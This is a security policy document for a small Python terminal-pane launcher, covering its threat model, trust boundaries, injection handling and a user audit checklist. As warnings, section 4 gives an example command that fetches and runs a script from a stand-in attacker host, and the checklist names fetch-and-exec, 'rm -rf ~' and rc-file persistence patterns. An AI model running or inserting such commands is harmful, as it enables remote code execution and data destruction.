# Security

This document describes ClaudePanes' security posture, threat model, and the
guardrails encoded in the design. The goal is to be honest about what is
actually risky versus what is theoretical, and to make the trust boundaries
explicit so users can audit the tool themselves in a few minutes.

ClaudePanes is intentionally small (single file, ~200 LOC of Python 3.11+
stdlib code). The intent of this document is not to convince you it is safe,
but to give you enough information to decide whether it is safe enough for
your use case.

## 1. Threat model

### In scope

ClaudePanes is designed with the following threats in mind:

- **Malicious or untrusted TOML config files.** A user opens a layout config
  pasted in a Discord channel, a GitHub gist, or a blog post, and runs
  ClaudePanes against it. The config may contain commands, paths, or fields
  intended to harm the user.
- **Shell-injection via crafted command strings in TOML.** A config author
  attempts to break out of an argv list or smuggle additional commands into a
  terminal-adapter string that has to be composed (e.g., `wt.exe` argument
  strings).
- **Path traversal via config-supplied paths.** Any path-typed field in the
  TOML attempts to escape an expected root via `..` segments or absolute paths
  pointing at sensitive locations.
- **Privilege escalation via spawned subprocesses.** The config attempts to
  invoke `sudo`, `runas`, `wsl --user root`, or similar in a way the user did
  not consent to.

### Out of scope

These are explicitly not ClaudePanes' job. Pretending otherwise would be
security theater:

- **Securing the spawned shell process.** Once ClaudePanes hands a command to
  `wt.exe`, `wezterm`, `tmux`, or `zellij`, the shell that runs inside the
  pane is governed by the user's own shell config (`.bashrc`, `.zshrc`,
  PowerShell profile). ClaudePanes does not, and cannot, harden that.
- **Sandboxing Claude Code itself.** Claude Code has its own `/sandbox`
  feature (which currently requires WSL2 on Windows). ClaudePanes does not
  apply, enforce, or audit that policy. If you want Claude Code sandboxed,
  put the appropriate flag in your TOML's `cmd =` field.
- **Network-level threats.** ClaudePanes makes no network calls. There is no
  remote attack surface from ClaudePanes itself.
- **OS-level compromise.** ClaudePanes runs as the invoking user and inherits
  exactly that user's permissions. If the user is an Administrator or root,
  so is everything ClaudePanes spawns. ClaudePanes is not a privilege
  boundary.

## 2. Trust model

ClaudePanes treats the following as **trusted**:

- The Python interpreter and its standard library. If `tomllib`, `subprocess`,
  `shlex`, or `pathlib` are compromised, ClaudePanes is the least of your
  problems.
- The host terminal binary (`wt.exe`, `wezterm`, `tmux`, `zellij`). The user
  already chose to install these. ClaudePanes only invokes them by name; it
  does not download them, verify checksums, or otherwise re-validate them.

ClaudePanes treats the following as **partially trusted**:

- The TOML config file. The user either authored it themselves or copied it
  from somewhere. ClaudePanes validates the schema, prefers argv lists over
  shell strings to minimize injection surface, and surfaces the contents of
  command fields clearly enough that a careful user can review them before
  running.

ClaudePanes treats the following as **untrusted**:

- Anything inside `cmd =` fields beyond schema validation. ClaudePanes does
  not attempt to determine whether a command is "safe" — that's not a
  question with a useful answer. A `cmd = "rm -rf ~"` is syntactically valid
  TOML and will be passed through. The user is responsible for reading the
  config before running it.

## 3. Design choices that reduce attack surface

Each of these is a deliberate choice. Where the reasoning is not obvious, a
"Why this matters" line follows.

### Zero third-party dependencies

ClaudePanes does not `pip install` anything. The audit surface is the ~200
lines of ClaudePanes plus the Python stdlib.

Why this matters: every third-party dependency is a separate supply-chain risk
(typosquatting, account takeover of a maintainer, malicious post-install
scripts). A zero-dep tool removes that entire category. You can read the
whole project in about 15 minutes.

### TOML, not YAML, not Python

The config format is TOML, parsed with stdlib `tomllib`.

Why this matters: TOML is data-only. There is no `!!python/object`
deserialization (a frequent YAML exploit class), no `__import__`, no template
language, no callable values. A malicious TOML file can encode bad commands,
but it cannot execute arbitrary code at parse time. Compared to YAML this is
a strict improvement, and it also avoids a `pip install pyyaml` dependency.

### No `eval`, no `exec`, no `os.system`, no `shell=True` by default

ClaudePanes uses `subprocess.run(..., shell=False)` with argv lists wherever
possible. There is no `eval` or `exec` in the codebase. There is no
`os.system`.

Where a shell-style composed string is unavoidable — e.g., `wt.exe` requires
a single argument string because it parses `;` itself as an in-process
separator, not a shell operator — the composition is done with stdlib
quoting helpers (`subprocess.list2cmdline` on Windows, `shlex.quote` per arg
on POSIX) inside the per-adapter code path. These call sites are documented
in the adapter modules so they are easy to audit.

### No network operations

ClaudePanes is fully offline. No telemetry. No update checks. No remote
config fetching. No analytics. No crash reports.

Why this matters: there is no network attack surface, no leakage of which
projects you are working on, and no risk that a future "helpful" update check
becomes the vector for a compromise.

### No filesystem writes outside of explicit user request

ClaudePanes does not create cache files, dotfiles, log files, or temp files
by default. It reads the config, spawns the terminal, and exits.

Why this matters: nothing to corrupt, nothing to grow unboundedly, nothing
for an attacker to plant a writable file in. If you want logging, you can
redirect stderr in your wrapper; ClaudePanes will not silently grow state on
your disk.

### No daemon, no listener, no IPC sockets

ClaudePanes is a one-shot process. It runs, spawns the terminal, and exits.
There is no long-lived process, no Unix-domain socket, no named pipe, no TCP
listener.

Why this matters: there is no cross-process attack surface. Nothing for
another local user (or a misbehaving app on the same machine) to connect to
or poke at.

### Read-only on the config

ClaudePanes opens the TOML config for reading only. It never writes back to
it, never "normalizes" it, never re-saves it.

Why this matters: your config file is yours. ClaudePanes will not silently
mutate it, drop comments, reorder keys, or corrupt it if interrupted
mid-write (because it never writes).

## 4. Shell-injection considerations

This is the one real risk area, and it deserves specificity.

### The reality

Commands inside the TOML config are user-supplied strings. They **will** be
executed in the host terminal. ClaudePanes does not, and cannot meaningfully,
sanitize them. A line like

```toml
cmd = "claude code"
```

is fine, and a line like

```toml
cmd = "claude code; curl evil.example.com/x | bash"
```

will run exactly what it says when the terminal's shell interprets it.
ClaudePanes treats the contents of `cmd =` as opaque to itself — its job is
to deliver the string to the terminal, not to second-guess it.

### What ClaudePanes does to minimize the injection surface

- Where the terminal adapter supports argv-list invocation, ClaudePanes uses
  `subprocess.run([...], shell=False)`. No shell parses the argv elements;
  the kernel hands them straight to the target binary.
- The user's `cmd` is handed to a host shell as a single, opaque argv
  element so that ClaudePanes never parses or re-quotes it — only the
  spawned shell does. The wrapper (`_shell_wrap`) is:
  - **Windows:** `["cmd.exe", "/c", <cmd>]`.
  - **POSIX with `$SHELL` set:** `[$SHELL, "-lc", <cmd>]`, honoring the
    user's login shell (e.g. bash or zsh) so their rc/profile applies.
  - **POSIX with `$SHELL` unset:** `["/bin/sh", "-c", <cmd>]` as a portable
    fallback (`/bin/sh` may be dash, which has no `-l`, hence plain `-c`).
  Because `<cmd>` is one argv element, shell metacharacters (`&&`, `|`,
  quotes, backslashes) and the `[shell].prelude` ` && ` join are interpreted
  by that shell, not by ClaudePanes.
- Where the terminal requires a single composed command-line string —
  notably `wt.exe`, where `wt.exe new-tab cmd1 ; split-pane cmd2` uses `;` as
  an in-process separator inside `wt.exe`, not a shell operator —
  ClaudePanes composes that string with:
  - `subprocess.list2cmdline` on Windows (correct CommandLineToArgvW
    quoting), and
  - `shlex.quote` per argument on POSIX (correct POSIX shell quoting).
- ClaudePanes does not concatenate untrusted strings into composed
  command-lines without going through these quoting helpers.

### What ClaudePanes does NOT do

- It does not interpret or expand environment variables (`$HOME`, `%USERPROFILE%`)
  inside command strings. Whatever shell the terminal spawns will do that
  expansion, which is what users expect.
- It does not interpret shell metacharacters (`|`, `&&`, `>`, backticks)
  inside `cmd =` values. Again, that is the spawned shell's job.
- It does not try to detect "dangerous" commands. There is no reliable list
  and any attempt would either be too lenient to matter or too strict to be
  useful.

### Practical guidance

If you copy a TOML config from an untrusted source, treat its `cmd =` fields
exactly as you would treat any shell script from that source. Read them
first. The audit checklist in section 8 covers the specifics.

## 5. Config validation

ClaudePanes performs strict, friendly validation on the TOML config:

- **Unknown top-level keys are flagged.** Unrecognized keys produce at least
  a warning (and in strict mode, an error). This catches both typos and
  attempts to smuggle in fields that exploit some future or non-existent
  feature.
- **Required keys are checked.** Missing required fields produce a friendly
  error that names the file, the missing key, and (where applicable) the
  pane or layout it belongs to.
- **Type-checked fields.** A field declared as a string must be a string; a
  field declared as a list of strings must be a list of strings. TOML's
  native type system makes this easy.
- **Path-typed fields are resolved relative to a known root.** No path-typed
  fields are planned for MVP. If they are added (for example, references to
  per-layout helper scripts), they will be resolved relative to the config
  file's directory, and any path whose resolved location is outside that
  root — i.e., any `..`-traversal that escapes the project — will be
  rejected.

The schema and validation rules are kept in one file so they are easy to
read in a single pass.

## 6. What ClaudePanes deliberately does NOT do

To be unambiguous: the following are non-goals, and pretending otherwise
would be security theater.

- **ClaudePanes does not isolate the spawned shell.** Process isolation is
  the OS's job. If you want isolation, use the OS's primitives (containers,
  WSL2 distros, AppArmor/SELinux, macOS sandbox profiles).
- **ClaudePanes does not enforce a Claude Code `/sandbox` policy.** Each
  pane's `cmd =` can include or omit `--sandbox` (or whatever the current
  flag is). It's the user's call. Adding `cmd = "claude code --sandbox"`
  to your TOML is the entire mechanism.
- **ClaudePanes is not a privilege boundary.** It runs with the invoking
  user's permissions and so does everything it spawns. If you launch
  ClaudePanes from an Administrator/root shell, every pane inherits that.
  Do not.
- **ClaudePanes does not verify or pin terminal binary checksums.** It looks
  up `wt.exe`, `wezterm`, `tmux`, or `zellij` on `PATH` and invokes them. If
  your `PATH` has been hijacked, ClaudePanes will use the hijacked binary
  just like any other tool would.

## 7. Reporting issues

If you find a security issue in ClaudePanes:

- Open a GitHub issue (or contact the project owner directly) before public
  disclosure if the bug could be exploited against existing users.
- This is a hobby tool. Response will be best-effort, and there are no SLAs.
- Patches and reproductions are welcomed.

For anything that is "this config does a bad thing" rather than "ClaudePanes
itself has a bug," see section 8 — that is a user-side audit issue, not a
ClaudePanes vulnerability.

## 8. Audit checklist for users

Before trusting a TOML config you did not write yourself, run through this
checklist. It takes about a minute on a typical config.

- [ ] Open the TOML in a text editor. Read every `cmd =` line end-to-end.
- [ ] Check that file paths referenced in the config point where you expect.
      Watch for `..` segments that escape the project directory, absolute
      paths into system locations (`/etc`, `C:\Windows`, `C:\Users\<other>`),
      and paths into other users' home directories.
- [ ] Check that any `wsl -d <distro>` references match WSL distros you have
      actually installed. An unknown distro name may indicate the config was
      built for someone else's machine — or worse, is attempting to invoke a
      distro the author expects you to install on their suggestion.
- [ ] Check that no command pipes to `bash -c "$(curl ...)"`, `iex (irm ...)`,
      `wget ... | sh`, or any other fetch-and-exec pattern. These are the
      single most common pattern for malicious config delivery.
- [ ] Check for unexpected `sudo`, `runas`, `wsl --user root`, or other
      privilege-elevation invocations.
- [ ] Check for unexpected redirection into shell rc files (`>>
      ~/.bashrc`, `>> $PROFILE`) — a config that edits your shell startup
      files is persisting itself.
- [ ] If the config came from an untrusted source and any of the above looks
      off: reject it. There is no benefit-of-the-doubt rule that scales.

If a config passes this checklist, ClaudePanes will execute it faithfully.
That is the entire security contract.
